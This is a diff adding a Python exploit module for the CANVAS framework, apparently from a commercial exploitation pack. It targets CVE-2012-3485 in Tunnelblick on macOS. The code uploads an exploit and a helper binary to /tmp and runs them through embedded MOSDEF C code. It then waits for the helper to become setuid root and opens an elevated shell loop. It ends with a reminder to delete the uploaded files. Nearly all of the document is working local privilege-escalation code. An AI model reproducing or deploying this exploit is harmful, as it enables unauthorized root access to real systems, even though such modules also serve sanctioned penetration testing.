@@ -1,0 +1,159 @@
+#!/usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2012
+#
+
+import sys
+import time
+
+from exploitutils import *
+from canvasexploit import canvasexploit
+from canvaserror import *
+
+if '.' not in sys.path:
+    sys.path.append('.')
+
+NAME = 'd2sec_tunnelblick'
+DESCRIPTION = 'Elevate MOSDEF Node privileges through CVE-2012-3485'
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR']='Apple'
+DOCUMENTATION['Repeatability']='Infinite'
+DOCUMENTATION['CVE Name']='CVE-2012-3485'
+DOCUMENTATION['CVE Url']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3485'
+DOCUMENTATION['Notes']='Tested with Tunnelblick 3.2.8'
+VERSION = '1.0'
+PROPERTY = {}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Local'
+PROPERTY['ARCH'] = [['MACOSX']]
+
+
+class theexploit(canvasexploit):
+    def __init__(self):
+        canvasexploit.__init__(self)
+        self.name = NAME
+        self.node = None
+        self.lx = '3rdparty/D2SEC/exploits/d2sec_tunnelblick/Resources/x' # local path exploit
+        self.lh = '3rdparty/D2SEC/exploits/d2sec_tunnelblick/Resources/h' # local path helper
+        self.dx = '/tmp/x' # remote path exploit
+        self.dh = '/tmp/h' # remote path helper
+
+    def neededListenerTypes(self):
+        return []
+
+    def nodeUpload(self, src, dst):
+        try:
+            self.node.upload(src, destfilename = dst)
+        except NodeCommandError, i:
+            self.log('[D2] failed to upload %s to %s: %s' % (src, dst, str(i)))
+            return False
+        self.log('[D2] upload succeeded ...')
+        return True
+
+    def statFile(self, path):
+        O_RDONLY = self.node.shell.libc.getdefine('O_RDONLY')
+        fd = self.node.shell.open(path, O_RDONLY, 0755)
+        if fd < 0:
+            self.log('[D2] could not open %s ...' % path)
+            return {}
+        ret,stat = self.node.shell.fstat(fd)
+        self.node.shell.close(fd)
+        if ret == 0:
+            self.log('[D2] st_mode: %x' % stat['st_mode'])
+            self.log('[D2] st_uid: %x' % stat['st_uid'])
+            return stat
+        else:
+            self.log('[D2] fstat failed ...')
+            return {}
+
+    def execveHelper(self, wait = 0):
+        lvars = {}
+        lvars['ENV_XP'] = 'ENV_XP=%s' % self.dx
+        lvars['HELPER'] = self.dh
+        lvars['MOSDEF'] = '%d' % self.node.shell.fd
+        lvars['WAIT'] = wait
+
+        code = """
+        #import "string", "ENV_XP" as "ENV_XP"
+        #import "string", "HELPER" as "HELPER"
+        #import "string", "MOSDEF" as "MOSDEF"
+    
+        #import "int", "WAIT" as "WAIT"
+
+        #import "local", "execve" as "execve"
+        #import "local", "sendint" as "sendint"
+        #import "local", "fork" as "fork"
+        #import "local", "exit" as "exit"
+        #import "local", "waitpid" as "waitpid"
+
+        void
+        main()
+        {
+            char *argv[3];
+            char *env[2];
+            int pid;
+
+            argv[0] = HELPER;
+            argv[1] = MOSDEF;
+            argv[2] = NULL;
+        
+            env[0] = ENV_XP;
+            env[1] = NULL;
+
+            pid = fork();
+
+            if (pid == 0) {
+                execve(argv[0], argv, env);
+                exit(-1);
+            }
+
+            sendint(0);
+
+            if (WAIT == 1) {
+                waitpid(pid, 0, 0);
+            }
+        }
+        """
+        ret = self.node.shell.runCode(code, lvars)
+        self.log('[D2] execve helper ret: %d ...' % ret)
+        return ret
+
+    def run(self):
+        self.node = self.argsDict['passednodes'][0]
+        if 'osx' not in self.node.capabilities:
+            self.log('[D2] not an OSX node ...')
+            return False
+        stat = self.statFile(self.dh)
+        if stat != {} and (stat['st_uid'] == 0 and stat['st_mode'] & 04000):
+            self.log('[D2] already compromised ... initing elevated MOSDEF loop')
+            self.execveHelper(wait = 1)
+            return True
+
+        self.log('[D2] uploading helper and exploit ...')
+        if self.nodeUpload(self.lx, self.dx) == False:
+            return False
+        if self.nodeUpload(self.lh, self.dh) == False:
+            return False
+        
+        self.log('[D2] executing helper ...')
+        self.execveHelper()
+
+        i = 10
+        while i:
+            self.log('[D2] checking helper mode ...')
+            stat = self.statFile(self.dh)
+            if stat != {} and (stat['st_uid'] == 0 and stat['st_mode'] & 04000):
+                self.log('[D2] compromised ... initing elevated MOSDEF loop')
+                self.execveHelper(wait = 1)
+                break
+            i -= 1
+            time.sleep(1)
+
+        self.log('[D2] IMPORTANT: srm %s and %s' % (self.dh, self.dx))
+
+        return True
+
